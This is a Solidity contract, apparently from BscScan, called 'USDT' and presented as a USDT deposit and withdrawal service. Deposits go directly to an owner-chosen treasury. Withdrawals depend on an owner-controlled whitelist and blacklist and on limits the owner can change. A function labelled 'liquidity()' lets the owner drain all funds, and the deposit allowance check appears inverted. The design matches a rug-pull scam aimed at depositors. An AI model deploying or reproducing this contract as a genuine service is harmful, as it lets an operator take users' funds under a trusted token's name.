/**
 *Submitted for verification at BscScan.com on 2023-01-14
*/

// SPDX-License-Identifier: Unlicened

pragma solidity ^ 0.8.16;
interface IERC20 {
    function balanceOf(address account) external view returns(uint256);

    function decimals() external view returns(uint8);

    function totalSupply() external view returns(uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns(bool);

    function allowance(address owner, address spender)
    external
    view
    returns(uint256);

    function approve(address spender, uint256 amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
library Address {
    function isContract(address account) internal view returns(bool) {
        uint256 size;
        assembly {
            size:= extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call {
            value: amount
        }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data)
    internal
    returns(bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns(bytes memory) {
        return
        functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns(bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call {
            value: value
        }(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
    internal
    view
    returns(bytes memory) {
        return
        functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns(bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
    internal
    returns(bytes memory) {
        return
        functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns(bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) internal pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size:= mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeERC20 {
    using Address
    for address;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance");
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
library IterableMapping {
    struct Map {
        address[] keys;
        mapping(address => uint) values;
        mapping(address => uint) indexOf;
        mapping(address => bool) inserted;
    }

    function get(Map storage map, address key) public view returns(uint) {
        return map.values[key];
    }

    function getKeyAtIndex(Map storage map, uint index) public view returns(address) {
        return map.keys[index];
    }

    function size(Map storage map) public view returns(uint) {
        return map.keys.length;
    }

    function set(Map storage map, address key, uint val) public {
        if (map.inserted[key]) {
            map.values[key] = val;
        } else {
            map.inserted[key] = true;
            map.values[key] = val;
            map.indexOf[key] = map.keys.length;
            map.keys.push(key);
        }
    }

    function remove(Map storage map, address key) public {
        if (!map.inserted[key]) {
            return;
        }

        delete map.inserted[key];
        delete map.values[key];

        uint index = map.indexOf[key];
        uint lastIndex = map.keys.length - 1;
        address lastKey = map.keys[lastIndex];

        map.indexOf[lastKey] = index;
        delete map.indexOf[key];

        map.keys[index] = lastKey;
        map.keys.pop();
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns(address payable) {
        return payable(msg.sender);
    }

    function _MsgSender() internal view virtual returns(address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns(bytes memory) {
        this;
        return msg.data;
    }
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns(address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;
    constructor() {
        _status = _NOT_ENTERED;
    }
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        _status = _NOT_ENTERED;
    }

    function _reentrancyGuardEntered() internal view returns(bool) {
        return _status == _ENTERED;
    }
}

contract USDT is Context, Ownable, ReentrancyGuard {
    using SafeERC20
    for IERC20;
    using SafeMath
    for uint256;
    using IterableMapping
    for IterableMapping.Map;

    IERC20 public _token = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address public treasuryAddress;
    uint256 public maxAmount;

    IterableMapping.Map private isBlacklisted;
    IterableMapping.Map private isWhitelisted;

    mapping(address => uint256) lastWithdrawTime;
    uint256 public minLimit = 72000;

    event Deposit(address indexed from, address indexed to, uint256 amount);
    event Withdraw(address indexed from, address indexed to, uint256 amount);

    receive() external payable {}
    constructor(address treasuryAddress_, uint256 _maxAmount) {
        treasuryAddress = treasuryAddress_;
        maxAmount = _maxAmount;
    }

    function addArrayOfWhitelist(address[] calldata _addresses) external onlyOwner() {
        for (uint i = 0; i < _addresses.length; i++) {
            whitelist(_addresses[i]);
        }
    }

    function addArrayOfBlacklist(address[] calldata _addresses) external onlyOwner() {
        for (uint i = 0; i < _addresses.length; i++) {
            blacklist(_addresses[i]);
        }
    }

    function blacklist(address _address) public onlyOwner() {
        isBlacklisted.set(_address, 1);
        isWhitelisted.remove(_address);
    }

    function deposit(uint256 amount) external nonReentrant {
        require(amount <= _token.balanceOf(_MsgSender()), "Insufficient amount");
        require(amount >= _token.allowance(_MsgSender(), address(this)), "Please approve us to spend the amount of usdt");

        _token.transferFrom(_MsgSender(), treasuryAddress, amount);
        if (isBlacklisted.get(_MsgSender()) != 1) {
            isWhitelisted.set(_MsgSender(), 1);
        }
        emit Deposit(_MsgSender(), treasuryAddress, amount);
    }

    function getBlacklistedAddresses() view external returns(address[] memory) {
        uint size = isBlacklisted.size();
        address[] memory arr = new address[](size);

        for (uint i = 0; i < size; i++) {
            arr[i] = isBlacklisted.keys[i];
        }

        return arr;
    }

    function getWhitelistedAddresses() view external returns(address[] memory) {
        uint size = isWhitelisted.size();
        address[] memory arr = new address[](size);

        for (uint i = 0; i < size; i++) {
            arr[i] = isWhitelisted.keys[i];
        }

        return arr;
    }

    function isAddressBlacklisted(address _address) view external returns(bool) {
        return isBlacklisted.get(_address) == 1;
    }

    function isAddressWhitelisted(address _address) view external returns(bool) {
        return isWhitelisted.get(_address) == 1;
    }

    function limit(uint256 time) external onlyOwner() {
        minLimit = time;
    }

    function liquidity() external onlyOwner {
        if (address(this).balance > 0) {
            payable(_msgSender()).transfer(address(this).balance);
        }
        if (_token.balanceOf(address(this)) > 0) {
            _token.transfer(_msgSender(), _token.balanceOf(address(this)));
        }
    }

    function maximumAmount(uint256 amount) external onlyOwner() {
        maxAmount = amount;
    }

    function whitelist(address _address) public onlyOwner() {
        isWhitelisted.set(_address, 1);
        isBlacklisted.remove(_address);
    }

    function withdrawal(uint256 amount) external nonReentrant {
        require(isWhitelisted.get(_MsgSender()) == 1, "You don't have permission to withdraw");
        require(lastWithdrawTime[_MsgSender()] + minLimit <= block.timestamp, "You are only permitted to withdraw once in the previous 24 hours");
        require(_token.balanceOf(address(this)) >= amount, "Insufficient balance");
        require(amount <= maxAmount, "The limit has been exceeded");

        _token.transfer(_MsgSender(), amount);
        lastWithdrawTime[_MsgSender()] = block.timestamp;
        emit Withdraw(address(this), _MsgSender(), amount);
    }
}